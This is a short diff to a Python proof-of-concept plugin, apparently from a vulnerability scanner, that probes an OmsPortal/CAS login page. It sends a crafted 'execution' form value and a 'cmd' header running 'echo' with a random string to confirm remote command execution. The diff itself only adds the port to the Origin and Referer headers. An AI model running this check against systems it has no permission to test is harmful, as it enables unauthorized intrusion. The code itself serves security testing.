@@ -29,6 +29,7 @@ class POC():
         if self.success:
             return
         host = self.dictdata["url"]["host"]
+        port = self.dictdata["url"]["port"]
         rand_str = get_random_str(7).lower()
         req = {
             "method": "POST",
@@ -38,12 +39,12 @@ class POC():
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Connection": "close",
                 "Accept": "*/*",
-                "Origin": "https://{}".format(host),
+                "Origin": "https://{}:{}".format(host, port),
                 "Sec-Fetch-Site": "same-origin",
                 "Sec-Fetch-Mode": "cors",
                 "cmd": "echo {}".format(rand_str),
                 "Sec-Fetch-Dest": "empty",
-                "Referer": "https://{}/OmsPortal/login.jsp".format(host),
+                "Referer": "https://{}:{}/".format(host, port),
                 "Accept-Encoding": "gzip, deflate",
                 "Accept-Language": "zh-CN,zh;q=0.9"},
             "data": '''username=test&password=test&lt=LT-2-cZbwGIaGIX1dKwYcGivxcnBY2Puu5b-cas01.example.org&execution={}&_eventId=submit&submit=LOGIN'''.format(
